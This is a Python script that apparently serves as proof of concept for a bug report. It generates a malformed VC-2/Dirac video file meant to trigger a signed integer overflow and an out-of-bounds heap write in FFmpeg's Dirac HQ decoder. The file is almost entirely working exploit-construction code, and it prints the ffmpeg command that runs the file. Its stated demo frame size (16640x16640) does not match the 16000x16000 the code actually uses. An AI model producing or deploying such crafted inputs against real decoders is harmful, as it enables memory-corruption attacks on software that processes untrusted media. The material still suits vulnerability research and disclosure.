#!/usr/bin/env python3
"""
PoC generator for VULN 001:
  Integer Overflow in thread_buf Index -> OOB Heap Write in decode_hq_slice_row

CVE/BUG: CWE-190 Integer Overflow
Function: decode_hq_slice_row()
File: libavcodec/diracdec.c lines 918-926

Root cause:
  - s->thread_buf_size is declared as 'int' (line 180)
  - coef_buf_size (int64_t) is assigned to thread_buf_size at line 962
  - At line 923: &s->thread_buf[s->thread_buf_size * threadnr]
    When thread_buf_size > INT_MAX/2 and threadnr >= 2,
    the signed int multiplication overflows -> negative index -> OOB heap write

Trigger conditions:
  1. bit_depth = 10 (pshift=1) - increases coef_buf_size by 4x
  2. Large frame (>= 28384x28384) with num_y=3 so:
     - thread_buf_size > INT_MAX/2 (~1.07 GB)
     - thread_buf_size * 2 overflows int32
  3. num_y >= 3 (at least 3 slice rows) -> 3 decode threads (threadnr=0,1,2)
  4. System needs >= 3 decode threads active (use -threads 4)

Memory requirement for actual crash:
  - Y IDWT buffer: ~3.2 GB
  - Thread buffer: ~3.2 GB
  - Frame: ~2.5 GB
  - Total: ~10 GB free RAM required

For quick testing (OOM demonstration on smaller machines):
  Use DEMO mode (16640x16640 with num_y=3) which triggers the allocation
  attempt but may fail with OOM before the integer overflow occurs.

Usage:
  python3 vuln_001_gen.py          # Generates 28384x28384 (full crash PoC)
  python3 vuln_001_gen.py --demo   # Generates 16640x16640 (OOM demo)
"""

import struct
import sys
import math

# -----------------------------------------------------------------------
# Dirac interleaved exp-Golomb (UE-Golomb) bit writer
# -----------------------------------------------------------------------
class BitWriter:
    def __init__(self):
        self.buf = bytearray()
        self._cur = 0
        self._nbits = 0

    def write_bit(self, b):
        self._cur = (self._cur << 1) | (int(b) & 1)
        self._nbits += 1
        if self._nbits == 8:
            self.buf.append(self._cur)
            self._cur = 0
            self._nbits = 0

    def align(self):
        """Pad to byte boundary with zero bits."""
        while self._nbits > 0:
            self.write_bit(0)

    def ue(self, n):
        """
        Dirac interleaved exp-Golomb for unsigned integer n.

        Encoding of n:
          val = n + 1
          MSB is implicit (always 1).
          For each subsequent bit b (from second-MSB down to LSB):
            write '0', then write b
          Finally write '1'.
        Example:
          n=0: val=1 (1-bit), no extra bits -> write '1'
          n=1: val=2=0b10, extra bit: 0 -> write '0','0','1' = 001
          n=2: val=3=0b11, extra bit: 1 -> write '0','1','1' = 011
          n=3: val=4=0b100, extra bits: 0,0 -> 0,0,0,0,1 = 00001
        """
        val = n + 1
        k = val.bit_length() - 1   # number of bits after the implicit MSB
        for i in range(k - 1, -1, -1):
            self.write_bit(0)
            self.write_bit((val >> i) & 1)
        self.write_bit(1)

    def uint32be(self, n):
        """Write a 32-bit big-endian integer (byte-aligned)."""
        self.align()
        self.buf += struct.pack('>I', n & 0xFFFFFFFF)

    def raw_bytes(self, data):
        """Append raw bytes (byte-aligned)."""
        self.align()
        self.buf += bytes(data)

    def finish(self):
        self.align()
        return bytes(self.buf)


# -----------------------------------------------------------------------
# VC-2 parse info header (13 bytes)
# -----------------------------------------------------------------------
def parse_info_hdr(parse_code, next_parse_offset, prev_parse_offset):
    """
    Format (per SMPTE VC-2 / Dirac spec, clause 9.6):
      4 bytes: magic "BBCD"
      1 byte:  parse_code
      4 bytes: next_parse_offset (big-endian uint32)
      4 bytes: prev_parse_offset (big-endian uint32)
    """
    return (b'BBCD'
            + struct.pack('>B', parse_code)
            + struct.pack('>I', next_parse_offset)
            + struct.pack('>I', prev_parse_offset))


# -----------------------------------------------------------------------
# Sequence header payload
# -----------------------------------------------------------------------
def build_seq_header(width, height):
    """
    Construct sequence header payload (after the 13-byte parse_info header).

    Parsed by av_dirac_parse_sequence_header() in libavcodec/dirac.c:
      parse_parameters() -> major, minor, profile, level
      base_video_format  -> uses index 0 (custom base)
      source_parameters():
        custom_dimensions_flag  -> width, height
        custom_chroma_format    -> 4:2:0 (index 2)
        scan_format             -> progressive (default)
        frame_rate              -> default
        pixel_aspect_ratio      -> default
        clean_area              -> default
        signal_range            -> index 3 (10-bit studio, luma_depth=10)
        colour_spec             -> default
      picture_coding_mode       -> 0 (frames)
    """
    bw = BitWriter()

    # parse_parameters() - [DIRAC_STD] 10.1
    bw.ue(2)   # major_version = 2 (VC-2)
    bw.ue(0)   # minor_version = 0
    bw.ue(0)   # profile = 0
    bw.ue(1)   # level = 1

    # base_video_format = 0 (custom; gives 640x480 4:2:0 as defaults)
    bw.ue(0)

    # source_parameters() overrides:

    # frame_size() - [DIRAC_STD] 10.3.2
    bw.write_bit(1)   # custom_dimensions_flag = True
    bw.ue(width)      # FRAME_WIDTH
    bw.ue(height)     # FRAME_HEIGHT

    # chroma_sampling_format() - [DIRAC_STD] 10.3.3
    bw.write_bit(1)   # custom_chroma_format_flag = True
    bw.ue(2)          # 4:2:0 (index 2; default for base 0 is already 2, but be explicit)

    # scan_format() - [DIRAC_STD] 10.3.4
    bw.write_bit(0)   # no custom scan format (use progressive default)

    # frame_rate() - [DIRAC_STD] 10.3.5
    bw.write_bit(0)   # no custom frame rate

    # pixel_aspect_ratio() - [DIRAC_STD] 10.3.6
    bw.write_bit(0)   # no custom aspect ratio

    # clean_area() - [DIRAC_STD] 10.3.7
    bw.write_bit(0)   # no custom clean area

    # signal_range() - [DIRAC_STD] 10.3.8
    bw.write_bit(1)   # custom_signal_range_flag = True
    bw.ue(3)          # index 3 = 10-bit studio (MPEG levels)
                      # -> luma_depth=10, pshift=1, YUV420P10

    # colour_spec() - [DIRAC_STD] 10.3.9
    bw.write_bit(0)   # no custom colour spec

    # picture_coding_mode = 0 (progressive frames)
    bw.ue(0)

    return bw.finish()


# -----------------------------------------------------------------------
# HQ picture payload (intra, parse_code=0xE8)
# -----------------------------------------------------------------------
def build_hq_picture(num_y, wavelet_depth=4):
    """
    Construct an intra HQ picture payload.

    Parse code 0xE8 gives:
      num_refs = 0 (intra)
      hq_picture = True  (0xE8 & 0xF8 == 0xE8)
      low_delay  = True  (0xE8 & 0x88 == 0x88)
      ld_picture = False

    Payload structure (parsed by dirac_decode_picture_header +
    dirac_unpack_idwt_params in diracdec.c):

      picture_header():
        4 bytes picture_number (uint32 BE)

      [align]

      transform_parameters():
        wavelet_idx   (UE-Golomb)
        wavelet_depth (UE-Golomb)
        -- low_delay branch (hq_picture=True) --
        num_x         (UE-Golomb)
        num_y         (UE-Golomb)
        prefix_bytes  (UE-Golomb)  <- highquality.prefix_bytes
        size_scaler   (UE-Golomb)  <- highquality.size_scaler
        custom_quant_matrix (1 bit)

      [align]

      slice_data (num_x * num_y minimal slices):
        For each slice: 4 zero bytes
          bytes = prefix_bytes + 1 = 1
          i=0: buf[1]=0 -> bytes=2
          i=1: buf[2]=0 -> bytes=3
          i=2: buf[3]=0 -> bytes=4
        This passes the slice validation in decode_lowdelay().
    """
    bw = BitWriter()

    # picture_header(): 4-byte picture_number
    bw.align()
    bw.uint32be(0)   # picture_number = 0

    # align before transform params
    bw.align()

    # transform_parameters():
    # Note: zero_res = 0 is set internally (num_refs=0 intra -> no bitread)
    bw.ue(0)          # wavelet_idx = 0 (Deslauriers-Dubuc 9,7)
    bw.ue(wavelet_depth)  # wavelet_depth

    # low_delay branch (hq_picture): num_x, num_y, then HQ params
    bw.ue(1)          # num_x = 1
    bw.ue(num_y)      # num_y

    # highquality parameters (s->hq_picture branch):
    bw.ue(0)          # prefix_bytes = 0
    bw.ue(1)          # size_scaler = 1

    # quant_matrix: use default (wavelet_depth <= 4, so default is valid)
    bw.write_bit(0)   # custom_quant_matrix = False

    # align before slice data
    bw.align()

    # Slice data: num_x=1, num_y=num_y -> num_y slices total
    # Each minimal slice: 4 zero bytes (passes decode_lowdelay() validation)
    # The parsing loop:
    #   bytes = prefix_bytes(0) + 1 = 1
    #   i=0: buf[bytes=1]=0 -> bytes = 1 + 0*size_scaler(1) + 1 = 2
    #   i=1: buf[2]=0 -> bytes = 3
    #   i=2: buf[3]=0 -> bytes = 4
    #   check: 4*8=32 bits, need bufsize >= 32 bits
    # So each slice consumes 4 bytes.
    for _ in range(num_y):
        bw.raw_bytes([0x00, 0x00, 0x00, 0x00])

    return bw.finish()


# -----------------------------------------------------------------------
# Assemble the full VC-2 bitstream
# -----------------------------------------------------------------------
def build_vc2(width, height, num_y, wavelet_depth=4):
    """
    Build a complete VC-2 bitstream:
      [Sequence Header] [HQ Intra Picture] [End of Sequence]
    """
    # Build payloads
    seq_payload = build_seq_header(width, height)
    pic_payload = build_hq_picture(num_y, wavelet_depth)

    # Size of each data unit = 13-byte header + payload
    seq_unit_size = 13 + len(seq_payload)
    pic_unit_size = 13 + len(pic_payload)
    eos_unit_size = 13  # End of Sequence has no payload

    # Parse Info headers
    # next_parse_offset = size of THIS data unit (distance to next PI header)
    # prev_parse_offset = size of PREVIOUS data unit
    PCODE_SEQ_HEADER = 0x00
    PCODE_PICTURE_HQ = 0xE8
    PCODE_END_SEQ    = 0x10

    seq_pi  = parse_info_hdr(PCODE_SEQ_HEADER, seq_unit_size, 0)
    pic_pi  = parse_info_hdr(PCODE_PICTURE_HQ, pic_unit_size, seq_unit_size)
    eos_pi  = parse_info_hdr(PCODE_END_SEQ,    eos_unit_size, pic_unit_size)

    stream = (seq_pi + seq_payload
            + pic_pi + pic_payload
            + eos_pi)
    return stream


# -----------------------------------------------------------------------
# Vulnerability analysis helper
# -----------------------------------------------------------------------
def estimate_thread_buf_size(width, height, num_y, wavelet_depth=4, pshift=1):
    """
    Estimate thread_buf_size as the decoder would compute it.
    Uses subband_coeffs for the last slice (x=0, y=num_y-1).
    """
    # CALC_PADDING: round up to multiple of 2^wavelet_depth
    def calc_padding(size, depth):
        mod = 1 << depth
        return ((size + mod - 1) >> depth) << depth

    w = calc_padding(width, wavelet_depth)
    h = calc_padding(height, wavelet_depth)

    coef = 0
    for level in range(wavelet_depth):
        # Each halving gives band dims at that level
        w_level = w >> (wavelet_depth - level)
        h_level = h >> (wavelet_depth - level)

        # Last slice (y = num_y-1), x = 0 (num_x=1)
        top   = h_level * (num_y - 1) // num_y
        tot_v = (h_level * num_y) // num_y - top   # = h_level - top
        tot_h = (w_level * 1) // 1 - 0              # = w_level (num_x=1)
        tot   = tot_h * tot_v

        # Multiplier: 4 for level 0 (includes LL band), 3 for level > 0
        mul = 4 if level == 0 else 3
        coef += tot * mul

    coef_buf_size = (coef + 8) * (1 << (1 + pshift)) + 512
    return coef_buf_size


def main():
    demo_mode = '--demo' in sys.argv

    if demo_mode:
        # Demo mode: 16000x16000, passes av_image_check_size2 check
        # thread_buf_size ~ 341M (no int overflow), but exercises the code path.
        # Memory needed: ~700 MB (feasible on most machines)
        WIDTH  = 16000
        HEIGHT = 16000
        NUM_Y  = 3
        label  = "DEMO (exercises decode_lowdelay path; no int overflow due to size limits)"
    else:
        # Full PoC: requires ~10 GB RAM for actual OOB write
        # NOTE: The current FFmpeg build rejects images > ~16256x16256 via
        #       av_image_check_size2() in ff_set_dimensions().
        # This PoC documents the theoretical overflow condition:
        #   thread_buf_size ~ 1.074 GB > INT_MAX/2
        #   thread_buf_size * threadnr=2 = ~2.149 GB overflows int32
        # An older FFmpeg without the stride size check would be vulnerable.
        WIDTH  = 28384
        HEIGHT = 28384
        NUM_Y  = 3
        label  = "FULL POC (theoretical: int overflow on systems without stride size check)"

    WAVELET_DEPTH = 4
    output_file   = "vuln_001_input.vc2"

    print(f"[*] Generating VC-2 PoC file: {label}")
    print(f"    Frame: {WIDTH}x{HEIGHT}, 10-bit 4:2:0")
    print(f"    num_y={NUM_Y}, wavelet_depth={WAVELET_DEPTH}")

    # Estimate thread_buf_size
    tbs = estimate_thread_buf_size(WIDTH, HEIGHT, NUM_Y, WAVELET_DEPTH, pshift=1)
    print(f"    Estimated thread_buf_size: {tbs:,} bytes ({tbs / 2**30:.3f} GB)")
    INT_MAX = 2**31 - 1
    if tbs > INT_MAX // 2:
        print(f"    thread_buf_size > INT_MAX/2 -> multiplication overflow with threadnr=2!")
        overflow_result = (tbs * 2) & 0xFFFFFFFF
        if overflow_result > INT_MAX:
            overflow_result -= 2**32
        print(f"    thread_buf_size * 2 = {tbs*2:,} -> int32 result: {overflow_result:,}")
        print(f"    OOB offset: {overflow_result} bytes (NEGATIVE -> before buffer)")
    else:
        print(f"    thread_buf_size <= INT_MAX/2 -> no int overflow (demo mode)")
    print()

    # Build the VC-2 stream
    stream = build_vc2(WIDTH, HEIGHT, NUM_Y, WAVELET_DEPTH)
    with open(output_file, 'wb') as f:
        f.write(stream)
    print(f"[+] Written {len(stream)} bytes to {output_file}")
    print()
    print(f"[*] Run: ffmpeg -threads 4 -i {output_file} -f null -")
    print(f"    Expected: thread buffer allocation (~{3 * tbs / 2**30:.1f} GB)")
    print(f"    On machines with ~10+ GB RAM: OOB heap write at decode_hq_slice_row")
    print(f"    On machines with less RAM: ENOMEM (still demonstrates vulnerable path)")


if __name__ == '__main__':
    main()
